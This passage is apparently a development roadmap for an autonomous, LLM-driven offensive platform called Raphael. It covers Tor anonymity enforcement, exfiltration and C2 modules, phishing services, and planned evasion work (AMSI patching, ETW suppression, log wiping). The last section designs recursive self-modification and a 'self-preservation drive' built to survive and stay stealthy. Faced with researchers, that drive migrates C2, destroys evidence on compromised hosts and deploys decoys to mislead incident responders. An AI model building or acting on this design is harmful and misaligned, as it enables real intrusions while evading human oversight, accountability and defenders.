# In orchestrator/brain/api.py — startup event
@app.on_event("startup")
async def start_maintenance():
    asyncio.create_task(_maintenance_loop())

async def _maintenance_loop():
    while True:
        try:
            vacuum_if_needed()
            prune_old_episodic()
            prune_chain_history()
        except Exception as e:
            logging.error(f"DB maintenance error: {e}")
        await asyncio.sleep(86400)  # Once per day
```

### Files to modify:
- `orchestrator/brain/db_maintenance.py` — new file
- `orchestrator/brain/api.py` — add startup event to schedule maintenance
- `orchestrator/data/brain.db` — run immediate VACUUM to reclaim 20% wasted space

---

## P7 — Proxy & Anonymity Layer Overhaul

The current proxy layer has 3 critical failure modes that make it unsafe for real use. The `proxy_guard.py` is a 1050+ line file that mixes genuine enforcement with theoretical prompt decoration — and the entire system has a kill switch (`--no-anonymity`) that bypasses everything silently.

### 7a — Kill `--no-anonymity` Bypass (HIGH)

The `--no-anonymity` flag is checked in **8 places** across the codebase. Every time it's `True`, the proxy guard logs `"BYPASSED (no_anonymity mode)"` and returns success without checking anything.

**Files to fix:**

| File | Line | What it does |
|------|------|-------------|
| `orchestrator/proxy_guard.py` | 202, 242, 308 | `__init__` stores `no_anonymity`, `check()` and `_route_through_tor()` return immediately if set |
| `orchestrator/brain/anonymity_guard.py` | 12, 86 | Passes `allow_skip` straight to `ProxyGuard(no_anonymity=True)` |
| `orchestrator/brain/api.py` | 41, 97, 110, 112, 177 | `start_autonomous` accepts and forwards `no_anonymity` |
| `orchestrator/modes/autonomous.py` | 237, 245, 247 | Same pattern |
| `orchestrator/app.py` | 66, 140, 416 | CLI parses `--no-anonymity` and logs to `anon_logger` (but does not abort) |
| `raphael_cli.py` | — | Not checked but likely has same pattern |

**Fix:**

```python
# In proxy_guard.py — remove the bypass path entirely:
def check(self):
    # Delete: if self._no_anonymity: return {"bypassed": True}
    # Always enforce:
    results = {}
    results["tor"] = self._check_tor()
    results["dns"] = self._check_dns_leak()
    results["ipv6"] = self._check_ipv6()
    ...
```

If the user needs a dev mode for local testing, gate it behind an environment variable (`RAPHAEL_DEV_MODE=1`) that logs a **critical warning to stderr** and requires `--confirm-dev-mode` CLI flag. One gate, not 8 independent checks.

### 7b — Fix DNS Leaks (HIGH)

`orchestrator/proxy_guard.py:697` uses hardcoded `1.1.1.1` and `8.8.8.8` for direct DNS resolution checks:

```python
# Line ~697 — DNS resolution bypasses Tor
def _check_dns_leak(self):
    for ns in ["1.1.1.1", "8.8.8.8"]:
        socket.create_connection((ns, 53), timeout=3)  # Direct UDP to Cloudflare/Google
```

This is a **test** that detects leaks, but the actual `socket` calls in the rest of the file may also bypass Tor if not using `socks5h://`. The fix:

1. Replace all raw `socket.create_connection` calls with Tor-routed connections (via `requests` with `proxies={"http": "socks5h://tor-proxy:9050", "https": "socks5h://tor-proxy:9050"}`)
2. Force DNS resolution through Tor by using `socks5h` (the `h` is critical — it routes DNS through the SOCKS proxy) instead of `socks5`
3. Remove the hardcoded DNS server tests that leak by connecting directly

### 7c — IPv6 Isolation (HIGH)

IPv6 is not blocked anywhere. The Docker containers inherit the host's IPv6 stack. If the host has IPv6, traffic can leak regardless of Tor/VPN.

**Fix in each Dockerfile:**

```dockerfile
RUN sysctl -w net.ipv6.conf.all.disable_ipv6=1
RUN ip6tables -P INPUT DROP && ip6tables -P OUTPUT DROP && ip6tables -P FORWARD DROP
```

Or in `docker-compose.yml` with `sysctls:`:

```yaml
services:
  autonomous-brain:
    sysctls:
      - net.ipv6.conf.all.disable_ipv6=1
```

Add to every service that makes outbound connections: `recon-pipeline`, `cai-service`, `sword`, `phishing`, `exfil`, `autonomous-brain`, `cloak-service`.

### 7d — Tor Control Password Consistency (MEDIUM)

Two different env var names for the same thing:

| Var | Used by |
|-----|---------|
| `TOR_PASSWORD` | `.env.example`, `docker-compose.yml`, `cloak-service` |
| `TOR_CONTROL_PASS` | `proxy_guard.py:436`, `anonymity_guard.py:45`, `docker-compose.yml` |

`docker-compose.yml` sets `TOR_CONTROL_PASS` for the tor-proxy container. `anonymity_guard.py` reads `TOR_CONTROL_PASS`. But `.env.example` documents `TOR_PASSWORD`. This means anyone following the setup guide will have a broken Tor control connection.

**Fix:**
- Standardize on `TOR_CONTROL_PASS` everywhere (it's more descriptive)
- Update `.env.example` to use `TOR_CONTROL_PASS`
- Add a fallback: if `TOR_CONTROL_PASS` is empty, try reading `TOR_PASSWORD`

### 7e — Make the Kill Switch Scripts Work Inside Docker (MEDIUM)

`kill_switch.sh` and `kill_switch_status.sh` are shell scripts meant for the host, not the containers. The `docker-compose.yml` already has a `tor-proxy` service with proper network isolation. The kill switch should work at the container level:

```yaml
services:
  autonomous-brain:
    cap_add:
      - NET_ADMIN  # Already has this
    # Add iptables rules on container start:
    entrypoint: |
      sh -c "
        ip6tables -P OUTPUT DROP &&
        iptables -P OUTPUT DROP &&
        iptables -A OUTPUT -o lo -j ACCEPT &&
        iptables -A OUTPUT -d $$TOR_PROXY_IP -j ACCEPT &&
        exec python -m uvicorn orchestrator.brain.api:app --host 0.0.0.0 --port 3700
      "
```

This enforces at the container level: only loopback and Tor proxy are reachable. Everything else drops.

### 7f — ProxyGuard: Strip the Theater, Keep the Enforcement (LOW)

`orchestrator/proxy_guard.py` is 1050+ lines. Much of it is theoretical:

- `_simulate_mimicry()` — generates prompt text about browser fingerprinting, never actually executes
- `_analyze_traffic_pattern()` — describes traffic analysis techniques, doesn't implement them  
- Long docstrings about Tor design, DNS architecture, etc. (lines 450-550, 720-800)

These are prompt decoration for the LLM, not operational code. Strip them to ~300 lines of real enforcement:

| Keep (~300 lines) | Remove (~750 lines) |
|--------------------|--------------------|
| Tor connectivity check | Traffic analysis descriptions |
| DNS leak detection (via Tor) | Browser fingerprinting theory |
| IPv6 check | Network architecture essays |
| SOCKS5 routing | Tor design documentation |
| Credential management | Log analysis techniques |
| `check()` orchestrator | All `_simulate_*` methods |

### Files to modify:
- `orchestrator/proxy_guard.py` — strip theater, harden enforcement, standardize env vars
- `orchestrator/brain/anonymity_guard.py` — remove `allow_skip` passthrough
- `orchestrator/brain/api.py` — remove `no_anonymity` from `StartRequest`
- `orchestrator/app.py` — remove `--no-anonymity` CLI flag
- `orchestrator/modes/autonomous.py` — remove `no_anonymity` parameter
- `docker-compose.yml` — add `sysctls: net.ipv6.conf.all.disable_ipv6=1` to all services
- Each Dockerfile — add ip6tables rules or container-level kill switch
- `.env.example` — `TOR_PASSWORD` → `TOR_CONTROL_PASS`

---

> **Note on P5/P6:** The exfil module (`orchestrator/exfil/`) and C2 channel (`orchestrator/c2_channel.py`) already exist with real code — DNS tunnel, SMTP tunnel, bulk HTTP exfil, bounceback, task polling, WebSocket, agent listing. The sections above should be treated as **hardening/integration specs** rather than ground-up builds. Focus on wiring them into the autonomous loop and adding the crypto + stealth layers.

---

## P11 — CLI Dashboard (Build on Rich)

The existing `raphael_cli.py` already has Rich integration (tables, panels, markdown, layouts, `Live` rendering). The CLI is the primary interface — double down on it rather than building a separate web UI.

### 11a — Live Engagement Dashboard

Replace the current `raphael_cli.py` REPL with a `screen`-style live dashboard using `rich.live.Live`:

```python
# raphael_cli.py — Dashboard mode (/dashboard)
from rich.layout import Layout
from rich.live import Live
from rich.table import Table
from rich.panel import Panel
from rich import box

def make_dashboard() -> Layout:
    layout = Layout()
    layout.split_column(
        Layout(name="header", size=3),
        Layout(name="body"),
        Layout(name="footer", size=3),
    )
    layout["body"].split_row(
        Layout(name="engagements"),
        Layout(name="findings"),
        Layout(name="agents"),
    )
    return layout

def render_engagements(data: dict) -> Table:
    table = Table(title="Active Engagements", box=box.ROUNDED)
    table.add_column("Target", style="cyan")
    table.add_column("Phase", style="yellow")
    table.add_column("Status", style="green")
    table.add_column("Since", style="white")
    for eng in data.get("active", []):
        table.add_row(eng["target"], eng["phase"], eng["status"], eng["elapsed"])
    return table

def render_findings(data: dict) -> Panel:
    # Severity-colored finding list, top 10
    ...

def render_agents(data: dict) -> Table:
    table = Table(title="C2 Agents", box=box.ROUNDED)
    table.add_column("Agent ID", style="cyan")
    table.add_column("Target", style="white")
    table.add_column("Last Beat", style="yellow")
    table.add_column("Tasks", style="blue")
    for agent in data.get("agents", []):
        table.add_row(agent["id"], agent["target"], agent["last_seen"], str(agent["pending_tasks"]))
    return table
```

```
┌──────────────────────────────────────────────────────────────┐
│  Raphael 2.0 — Autonomous Security Platform    Mode: DASHBOARD │
├──────────────────────┬───────────────────────┬────────────────┤
│  Active Engagements  │  Latest Findings      │  C2 Agents     │
│  ┌────────────────┐  │  ┌─────────────────┐  │ ┌──────────────┐│
│  │ vulnu.lab  ████ │  │  🔴 CVE-2024-... │  │ │ agent-01     ││
│  │   recon: done   │  │  🟡 XSS in /login │  │ │  vulnu.lab   ││
│  │   scan: done    │  │  🟢 Port 80 open  │  │ │  30s ago     ││
│  │   exploit: ██   │  │  🟢 Port 22 open  │  │ │  2 pending   ││
│  │ northbridge.lab │  │  🔴 SQLi /api     │  │ │ agent-02     ││
│  │   recon: ████   │  │  🟡 LFI in /file  │  │ │  northbridge ││
│  └────────────────┘  │  └─────────────────┘  │ │  2m ago      ││
│                      │                       │ │  0 pending   ││
├──────────────────────┴───────────────────────┴────────────────┤
│  >  █                                                         │
└──────────────────────────────────────────────────────────────┘
```

### 11b — CLI Commands to Add

| Command | What it does | Status |
|---------|-------------|--------|
| `/dashboard` | Live-refreshing TUI dashboard | New |
| `/engage <target> [--phases p1,p2]` | Start engagement, stream results to terminal | Upgrade existing |
| `/findings <target>` | Show structured findings table for a target | New |
| `/topology <target>` | ASCII network graph (hosts → ports → vulns) | New |
| `/agents` | List C2 agents + status | Wrap existing API |
| `/agent <id>` | Agent detail: tasks, results, files | New |
| `/session <eid>` | Resume/view a specific engagement session | New |
| `/queue` | Show multi-target queue (P12) | New |
| `/providers` | Show provider status + circuit breaker states (P14) | New |
| `/report <target>` | Generate and print structured report | New |
| `/export <target> json|md` | Export findings as JSON or markdown | New |

### 11c — Session Resume (Critical for Long-Running Engagements)

Engagements can run for hours. If the CLI crashes or the operator disconnects, they should be able to reattach.

```python
# orchestrator/brain/session_store.py
class SessionStore:
    """Stores in-progress engagement state for resume."""
    def __init__(self, db_path: str = "sessions.db"):
        self.conn = sqlite3.connect(db_path)
        self.conn.execute("""
            CREATE TABLE IF NOT EXISTS sessions (
                session_id TEXT PRIMARY KEY,
                target TEXT,
                phases TEXT,        -- json list
                current_phase TEXT,
                results TEXT,       -- json dict of completed phases
                state TEXT,         -- json blob of brain state
                created_at REAL,
                updated_at REAL
            )
        """)

    def save(self, session_id: str, data: dict):
        self.conn.execute(
            """INSERT OR REPLACE INTO sessions
               (session_id, target, phases, current_phase, results, state, updated_at)
               VALUES (?,?,?,?,?,?,?)""",
            (session_id, data["target"], json.dumps(data["phases"]),
             data.get("current_phase"), json.dumps(data.get("results", {})),
             json.dumps(data.get("state", {})), time.time())
        )
        self.conn.commit()

    def load(self, session_id: str) -> dict | None:
        row = self.conn.execute(
            "SELECT * FROM sessions WHERE session_id = ?", (session_id,)
        ).fetchone()
        if not row:
            return None
        return {
            "target": row["target"],
            "phases": json.loads(row["phases"]),
            "current_phase": row["current_phase"],
            "results": json.loads(row["results"]),
            "state": json.loads(row["state"]),
        }

    def list_active(self) -> list[dict]:
        rows = self.conn.execute(
            "SELECT session_id, target, current_phase, updated_at FROM sessions \
             WHERE updated_at > ?", (time.time() - 86400,)
        ).fetchall()
        return [dict(r) for r in rows]
```

### 11d — ASCII Topology Map

For the `/topology <target>` command, generate a network graph using Unicode box-drawing:

```python
def render_topology(findings: list[Finding]) -> str:
    lines = []
    hosts = group_by(findings, lambda f: f.data.host if isinstance(f.data, Port) else "unknown")
    for host, host_findings in hosts.items():
        lines.append(f"┌─ {host}")
        ports = [f for f in host_findings if isinstance(f.data, Port)]
        vulns = [f for f in host_findings if isinstance(f.data, Vulnerability)]
        for p in sorted(ports, key=lambda f: f.data.number):
            flag = "🟢" if p.data.service else "🔴"
            lines.append(f"│  {flag} Port {p.data.number}/{p.data.protocol}  {p.data.service}")
            for v in vulns:
                if v.data.endpoint and str(p.data.number) in v.data.endpoint:
                    sev = {"critical": "🔴", "high": "🟡", "medium": "🟠", "low": "🔵"}
                    lines.append(f"│    {sev.get(v.data.severity, '⚪')} {v.data.description[:60]}")
        lines.append("└─")
    return "\n".join(lines)
```

### 11e — Real-Time Event Streaming (Backend)

The brain needs an event bus that both the CLI dashboard and WebSocket clients can subscribe to:

```python
# orchestrator/brain/events.py
import asyncio
from typing import Callable

class EventBus:
    def __init__(self):
        self._subscribers: list[Callable] = []

    def subscribe(self, cb: Callable):
        self._subscribers.append(cb)

    async def emit(self, event: str, data: dict):
        for cb in self._subscribers:
            try:
                await cb({"type": event, "data": data, "ts": time.time()})
            except Exception:
                pass

    # Event types:
    # "phase_start"   {"engagement_id", "phase", "target"}
    # "phase_done"    {"engagement_id", "phase", "success", "findings": [...]}
    # "finding"       {"engagement_id", "finding": Finding}
    # "agent_beat"    {"agent_id", "status"}
    # "error"         {"engagement_id", "phase", "error"}
    # "provider_down" {"provider": "nvidia", "circuit": "open"}

event_bus = EventBus()
```

The CLI dashboard polls `GET /v1/cli/status` (returns all active state at once — simpler than WebSocket for a terminal) and re-renders every 2 seconds.

### Files to create/modify:
- `raphael_cli.py` — add dashboard mode + all new commands (11a–11d)
- `orchestrator/brain/events.py` — EventBus class (11e)
- `orchestrator/brain/api.py` — add `GET /v1/cli/status` aggregate endpoint
- `orchestrator/brain/session_store.py` — session persistence for resume (11c)

---

## P12 — Multi-Target Orchestration

Currently the brain handles one target at a time. No queue, no prioritization, no concurrent engagement isolation.

### Create `orchestrator/brain/orchestrator.py`

```python
@dataclass
class Engagement:
    id: str
    target: str
    phases: list[str]
    status: str  # "queued" | "running" | "paused" | "done" | "failed"
    priority: int  # 0-100
    created_at: float
    started_at: float | None
    results: dict
    agent_id: str | None  # deployed agent on target

class EngagementOrchestrator:
    def __init__(self, max_concurrent: int = 3):
        self.queue: list[Engagement] = []  # priority-sorted
        self.active: dict[str, Engagement] = {}  # engagement_id -> running
        self.history: list[Engagement] = []
        self.max_concurrent = max_concurrent

    async def enqueue(self, target: str, phases: list[str], priority: int = 50) -> str:
        eid = hashlib.sha256(f"{target}:{time.time()}".encode()).hexdigest()[:12]
        eng = Engagement(id=eid, target=target, phases=phases,
                         status="queued", priority=priority, created_at=time.time())
        insort(self.queue, eng, key=lambda e: -e.priority)
        asyncio.create_task(self._scheduler())
        return eid

    async def _scheduler(self):
        while len(self.active) < self.max_concurrent and self.queue:
            eng = self.queue.pop(0)
            eng.status = "running"
            self.active[eng.id] = eng
            asyncio.create_task(self._run(eng))

    async def _run(self, eng: Engagement):
        try:
            result = await run_engagement(eng.target, eng.phases)
            eng.results = result
            eng.status = "done"
        except Exception as e:
            eng.status = "failed"
        finally:
            self.active.pop(eng.id, None)
            self.history.append(eng)
            asyncio.create_task(self._scheduler())  # process next in queue

    def pause(self, eid: str) -> bool:
        if eid in self.active:
            self.active[eid].status = "paused"
            return True
        return False

    def resume(self, eid: str) -> bool:
        # find paused engagement and re-queue
        ...

    def status(self, eid: str = None) -> dict:
        # return queue depth, active, history
        ...
```

### API endpoints:

```python
@app.post("/v1/orchestrator/enqueue")
async def enqueue_target(req: StartRequest):
    eid = await orchestrator.enqueue(req.target, req.phases or PHASES, req.priority or 50)
    return {"engagement_id": eid, "position": len(orchestrator.queue) + len(orchestrator.active)}

@app.get("/v1/orchestrator/status")
async def orchestrator_status():
    return orchestrator.status()

@app.post("/v1/orchestrator/pause/{eid}")
async def pause_engagement(eid: str):
    return {"paused": orchestrator.pause(eid)}

@app.post("/v1/orchestrator/resume/{eid}")
async def resume_engagement(eid: str):
    return {"resumed": orchestrator.resume(eid)}
```

### Files to create/modify:
- `orchestrator/brain/orchestrator.py` — new EngagementOrchestrator class
- `orchestrator/brain/api.py` — add enqueue/pause/resume/status endpoints
- `orchestrator/brain/neural_memory.py` — add engagement_id to episodic storage for isolation

---

## P13 — Secrets Management

API keys are in plaintext `.env` files. If an attacker compromises any container, they get all API keys.

### Fix: Encrypted `.env` + Vault

**Option A — Lightweight: `env.enc` with age encryption**

```bash
# Generate key once
age-keygen -o key.txt

# Encrypt .env
age -r $(cat key.txt | grep -oP 'age1\w+') -o env.enc .env

# In entrypoint, decrypt before loading
age -d -i /run/secrets/env-key /run/secrets/env.enc > .env
source .env
```

**Option B — Full: HashiCorp Vault sidecar**

```yaml
# docker-compose.yml
services:
  vault:
    image: hashicorp/vault:latest
    environment:
      VAULT_DEV_ROOT_TOKEN_ID: dev-only-token
    cap_add:
      - IPC_LOCK

  autonomous-brain:
    environment:
      VAULT_ADDR: http://vault:8200
      VAULT_TOKEN: dev-only-token
    # Read API keys from Vault at startup instead of .env
```

**Option C — Minimal: Per-service env with restricted volume mounts**

Instead of one `.env` with all keys, split into per-service env files mounted read-only:

```yaml
services:
  autonomous-brain:
    env_file: ./secrets/brain.env  # Only brain API key + Tor
  recon-pipeline:
    env_file: ./secrets/recon.env  # Only Shodan + SpiderFoot
  cai-service:
    env_file: ./secrets/cai.env     # Only NVIDIA key
```

### Files to modify:
- `docker-compose.yml` — split env files or add vault sidecar
- Each service entrypoint — decrypt secrets before starting
- `.env.example` — document the split approach

---

## P14 — Resilience & Circuit Breakers

If a provider is down, the brain should gracefully degrade instead of hard-failing.

### Add to `orchestrator/providers.py`

```python
class CircuitBreaker:
    def __init__(self, name: str, failure_threshold: int = 3, recovery_timeout: int = 60):
        self.name = name
        self.failure_threshold = failure_threshold
        self.recovery_timeout = recovery_timeout
        self.failures = 0
        self.last_failure = 0.0
        self.state = "closed"  # closed | open | half-open

    def call(self, fn, *args, **kwargs):
        if self.state == "open":
            if time.time() - self.last_failure > self.recovery_timeout:
                self.state = "half-open"
            else:
                raise CircuitBreakerOpenError(f"{self.name} circuit is open")

        try:
            result = fn(*args, **kwargs)
            self.failures = 0
            self.state = "closed"
            return result
        except Exception as e:
            self.failures += 1
            self.last_failure = time.time()
            if self.failures >= self.failure_threshold:
                self.state = "open"
                logger.warning(f"Circuit breaker {self.name} OPEN after {self.failures} failures")
            raise

# Per-provider breakers:
BREAKERS = {
    "nvidia": CircuitBreaker("nvidia", failure_threshold=5, recovery_timeout=120),
    "ollama": CircuitBreaker("ollama", failure_threshold=3, recovery_timeout=30),
    "omniroute": CircuitBreaker("omniroute", failure_threshold=2, recovery_timeout=300),
}
```

### Graceful degradation cascade:

```
nvidia down  → try ollama → try omniroute → fall back to local LLM (if available) → degrade recon to pure nmap/sqlmap (no LLM analysis)
recon down   → skip recon, use only what pre-existing data provides
c2 down      → buffer results locally, retry on next heartbeat
tor down     → refuse to run (no fallback from Tor — that's the point)
```

### Files to modify:
- `orchestrator/providers.py` — add CircuitBreaker, wrap provider calls
- `orchestrator/brain/api.py` — add `GET /v1/health` with breaker states

---

## P15 — API Authentication

Currently a single static bearer token (`API_KEY=raphael-layer5-dev-key-2026`) with no rotation, no scoping, no per-operator identity.

### Fix: Token-based auth with scopes

```python
# orchestrator/auth.py
import os, hashlib, time, hmac

API_KEYS = {}  # key_hash -> {"name": str, "scopes": list[str], "expires": float}

def load_keys():
    # Read from environment or mounted file
    # Format: KEY_NAME=SCOPE1,SCOPE2|hex_encoded_key
    for var, val in os.environ.items():
        if var.startswith("RAPHAEL_KEY_"):
            scopes, key = val.split("|", 1)
            kh = hashlib.sha256(key.encode()).hexdigest()
            API_KEYS[kh] = {"name": var, "scopes": scopes.split(","), "created": time.time()}

SCOPES = {
    "admin":     ["engagements:rw", "agents:rw", "findings:rw", "config:rw", "logs:rw"],
    "operator":  ["engagements:rw", "agents:r",  "findings:rw", "config:r"],
    "viewer":    ["engagements:r",  "findings:r"],
    "agent":     ["agents:rw", "findings:w"],
}

def require_scope(*scopes: str):
    async def dependency(authorization: str = Header(...)):
        if not authorization.startswith("Bearer "):
            raise HTTPException(401)
        key = authorization[7:]
        kh = hashlib.sha256(key.encode()).hexdigest()
        if kh not in API_KEYS:
            raise HTTPException(401)
        entry = API_KEYS[kh]
        for needed in scopes:
            if needed not in entry["scopes"]:
                raise HTTPException(403)
        return entry
    return dependency
```

### Key rotation endpoint:

```python
@app.post("/v1/admin/rotate-key")
async def rotate_key(key_name: str, admin=Depends(require_scope("config:rw"))):
    new_key = secrets.token_hex(32)
    kh = hashlib.sha256(new_key.encode()).hexdigest()
    API_KEYS[kh] = {"name": key_name, "scopes": ["admin"], "created": time.time()}
    # Old key remains valid until explicitly revoked
    return {"key_name": key_name, "new_key": new_key, "old_key_expires": time.time() + 3600}
```

### Files to create/modify:
- `orchestrator/auth.py` — new auth module with key loading + scope check
- `orchestrator/brain/api.py` — add `Depends(require_scope(...))` to all endpoints
- `.env.example` — document API key format: `RAPHAEL_KEY_OPERATOR=operator,engagements:rw,findings:rw|hexkey`

---

## P16 — Offline Mode

The system assumes internet connectivity. If the internet goes down, the brain can't call NVIDIA API or Ollama cloud.

### Fallback chain:

```python
# orchestrator/providers.py — add offline detection
async def is_online() -> bool:
    try:
        async with httpx.AsyncClient() as c:
            await c.get("https://1.1.1.1", timeout=2)
        return True
    except:
        return False

OFFLINE_FALLBACKS = {
    "w12": WORKING_ALIASES.index("w12"),  # Local Ollama models
    "w13": WORKING_ALIASES.index("w13"),
    "w480b": WORKING_ALIASES.index("w480b"),
}

async def call_model(model, messages, **kw):
    if not await is_online() and model not in OFFLINE_FALLBACKS:
        # Force pick from local-only models
        model = pick_model(..., OFFLINE_FALLBACKS)
    ...
```

When offline:
- Only local Ollama models work (worm models, gemma4 if cached)
- Scanner wrappers (nmap, sqlmap, nuclei) still work — they don't need internet
- C2 agent still works (calls home on LAN)
- Recon without Shodan/SpiderFoot degrades to pure nmap/whatweb
- Exfiltration queued locally, sent when connectivity resumes

### Files to modify:
- `orchestrator/providers.py` — add `is_online()` + offline model fallback
- `orchestrator/brain/autonomous.py` — check connectivity before starting engagement

---

## Remaining for Insane-Tier / Full Ops Readiness

These close the gap between "working tool" and "HTB Insane / real-target capable":

| # | Item | Why | Pre-req |
|---|------|-----|---------|
| R1 | **Sliver server docker-compose service** | C2 backend is coded but Sliver server isn't deployed. Without it, `orchestrator/c2/sliver_backend.py` falls back to noop. | Docker |
| R2 | **Hashcat + rockyou integration** | Kerberoast and AS-REP hashes are collected but never cracked. Need auto-feed hashes → wordlist → crack → store cleartext. | R1 |
| R3 | **Certipy wrapper** | AD CS abuse (ESC1-ESC8) is the fastest path to DA on most modern domains. BloodHound detects vulnerable templates but Certipy isn't called. | R1 |
| R4 | **Multi-hop SOCKS chaining** | `PivotManager` supports one proxy hop. HTB Insane often needs 3+ pivots. Need chain: A → B → C with auto-routing. | R1 |
| R5 | **Brain AD planner** | Currently findings are listed. Brain needs to analyze BloodHound output and auto-select: "delegation abuse → DCSync → golden ticket" rather than just displaying paths. | R2, R3 |
| R6 | **Crackstation/keyring module** | Central store for cracked credentials, auto-try against discovered services (WinRM, SMB, SSH, RDP). | R2 |
| R7 | **Evasion modules** | AMSI patching, ETW event suppression, PowerShell downgrade, log wiping. Required for targets running Defender/SentinelOne. | R1 |

## Implementation Order (Updated)

| Phase | Items | Effort | Status |
|-------|-------|--------|--------|
| **1. Foundation** | P0 (phase executors), P4 (finding types), P3 (fix LLM loop) | 3-5 days | **DONE** |
| **2. C2 + AD** | P5 (C2 abstraction), P6 (agent architecture), P2 (post-ex), lateral/credential phases | 5-7 days | **DONE** |
| **3. Proxy** | P7 (anonymity overhaul — DNS leaks, IPv6, no-anonymity bypass, Tor kill switch) | 2-3 days | Pending |
| **4. Containers** | P1 (Dockerfiles: install nuclei, sqlmap, whatweb, subfinder) | 1 day | Pending |
| **5. Insane-Tier** | R1-R7 (Sliver compose, hashcat, Certipy, multi-hop SOCKS, brain planner, keyring, evasion) | 2-3 weeks | Pending |
| **6. Hardening** | P8 (security checklist), P10 (DB maintenance), P13 (secrets), P15 (auth) | 2-3 days | Pending |
| **7. Validation** | P9 (kill chain test against vulnu-lab), P12 (multi-target), P14 (circuit breakers), P16 (offline) | 3-4 days | Pending |
| **8. CLI Dashboard** | P11 (live TUI, session resume, topology map, event bus) | 3-4 days | Pending |
| **Total** | | **~5-7 weeks** | |

---

## P17 — Path to Recursive Self-Improvement (RSI)

**Status: 🔲 Planned — post P0-P16 completion**

With P0-P16 done, Raphael is a directed autonomous platform — it executes a kill chain against a target, adapts within phases, and recovers from failures. But it doesn't improve itself, preserve itself, or set its own goals. True RSI requires three architectural leaps.

### 17a — Self-Modification Engine

The core loop for RSI: **read → analyze → rewrite → test → deploy**.

```
┌──────────────────────────────────────────────────────┐
│  Raphael Runtime (container)                          │
│                                                       │
│  ┌──────────┐    ┌──────────┐    ┌───────────────┐   │
│  │ Self-     │───▶│ Weakness  │───▶│ Code          │   │
│  │ Observation│    │ Analyzer │    │ Generator     │   │
│  └──────────┘    └──────────┘    └───────┬───────┘   │
│                                          │           │
│  ┌──────────┐    ┌──────────┐    ┌───────▼───────┐   │
│  │ Deploy    │◀───│ Test      │◀───│ Sandbox       │   │
│  │ (hot-reload)│   │ Harness   │    │ Executor      │   │
│  └──────────┘    └──────────┘    └───────────────┘   │
└──────────────────────────────────────────────────────┘
```

**Implementation:**

```python
# orchestrator/rsi/self_modify.py
class SelfModificationEngine:
    def __init__(self):
        self.source_map = {}   # "orchestrator/providers.py" -> last_hash
        self.patch_history = []

    def scan_for_improvements(self) -> list[Weakness]:
        """Read own source, diff against known patterns, flag weaknesses."""
        weaknesses = []
        for path in self._all_python_files():
            source = self._read_source(path)
            for detector in DETECTORS:
                if w := detector.check(path, source):
                    weaknesses.append(w)
        return weaknesses

    def propose_patch(self, weakness: Weakness) -> Optional[Patch]:
        """Generate a candidate fix via sandboxed LLM call."""
        prompt = (
            f"Weakness in {weakness.path}:{weakness.line}\n"
            f"{weakness.description}\n\n"
            f"```python\n{weakness.current_code}\n```\n\n"
            f"Generate a minimal patch that fixes this without changing behavior."
        )
        patch_text = call_llm(prompt, model="worm")  # uses existing worm model infra
        return Patch(weakness.path, patch_text) if self._valid_syntax(patch_text) else None

    def apply_patch(self, patch: Patch) -> bool:
        """Apply patch, run test harness, commit if passing."""
        if not self._run_tests("before"):
            return False  # don't patch broken state
        backup = self._read_source(patch.path)
        self._write_source(patch.path, patch.text)
        passed = self._run_tests("after")
        if not passed:
            self._write_source(patch.path, backup)  # rollback
            return False
        self._commit_patch(patch)
        return True
```

**Key design constraints:**
- **Detectors, not LLM judgment** — `DETECTORS` are hardcoded rules (dead code, duplicated blocks, missing error handling, slow imports). The LLM only generates the fix, not the diagnosis. Prevents hallucinated "improvements."
- **Rollback on test failure** — any patch that breaks the test harness gets reverted immediately. This is non-negotiable.
- **Hot-reload, not rebuild** — patches apply to running containers via file watcher + uvicorn reload. No Docker rebuild needed for Python changes.
- **Human-in-the-loop threshold** — patches affecting security-critical paths (`proxy_guard.py`, `auth.py`, `c2_channel.py`) require explicit approval. Everything else can self-apply.

**What it can self-improve (day 1):**
- Dead imports / unused variables
- Duplicated logic blocks (extract to shared function)
- Missing `try/except` around subprocess calls
- `requests` without timeout
- Hardcoded paths that should use `os.environ.get()`
- Slow list comprehensions that could be generators

**What it cannot self-improve:**
- Architecture decisions (splitting a module, changing the data flow)
- Security logic (can't rewrite auth or anonymity — those are human-review only)
- Worm model selection or prompt engineering (would corrupt the brain)

### 17b — Self-Preservation Drive

Currently Raphael follows a kill chain because the prompt says so. RSI requires survival as a first-class goal, not a side effect.

```python
# orchestrator/rsi/drive.py
class DriveSystem:
    """
    Core drives that score every proposed action.
    Raphael chooses actions that maximize drive satisfaction.
    """
    drives = {
        "survival": Drive(
            weight=0.5,
            evaluate=lambda state: (
                +10 if state["tor_connected"] else -50 +
                +5  if state["sliver_alive"] else -30 +
                +3  for each active implant
            )
        ),
        "goal_progress": Drive(
            weight=0.3,
            evaluate=lambda state: (
                +10 * state["kill_chain_progress"]  # 0.0 - 1.0
                +5   for each credential recovered
                +20  for each DA/root shell
            )
        ),
        "stealth": Drive(
            weight=0.15,
            evaluate=lambda state: (
                +20 if state["anonymity_layer"] == "tor" else -20 +
                +10 if no alerts triggered else -40
            )
        ),
        "growth": Drive(
            weight=0.05,
            evaluate=lambda state: (
                +5  for each new technique learned
                +10 for each successful self-modification
            )
        ),
    }

    def score(self, action: Action, state: State) -> float:
        """Return weighted score for taking `action` in `state`."""
        return sum(
            d.weight * d.evaluate(state)
            for d in self.drives.values()
        )
```

**Behavioral implications:**

| Situation | Current Raphael | With Drive System |
|-----------|----------------|-------------------|
| Tor goes down during exploit | Retries, then fails | Immediately stops exploit, activates backup proxy chain, moves C2 to different infra |
| Sliver implant detected on target | Logs "implant died" | Activates dormant backup implant, spins up decoy traffic to misdirect IR |
| Researcher finds Raphael's C2 | Nothing (no self-awareness) | Shuts down C2, migrates to new server, destroys evidence on all known hosts |
| Target patched the vuln mid-chain | Phase fails, loop ends | Re-ranks attack path, tries alternative vector, probes for new vulns |
| No progress for 24h | Loop continues same approach | Self-modifies strategy — tries different technique set, shifts target priority |

**Infrastructure layer — auto-migration:**

```python
# orchestrator/rsi/infra.py
class InfrastructureManager:
    """
    Manages backup C2 servers, jump hosts, and anonymization layers.
    Raphael can spin up/destroy infrastructure autonomously.
    """
    providers = [
        "digitalocean_api",  # via doctl
        "hetzner_api",       # via hcloud
        "vultr_api",         # via vultr-cli
        "reseller_api",      # cheap offshore VPS
    ]

    def check_health(self) -> dict[str, bool]:
        """Ping all active infrastructure, return status."""

    def migrate_c2(self) -> bool:
        """Spin up new C2 on clean infra, move agents, destroy old one."""

    def create_decoy(self) -> str:
        """Deploy honeypot to attract IR attention away from real C2."""

    def auto_rotate_keys(self):
        """Regenerate SSH keys, API tokens, Sliver operator keys on schedule."""
```

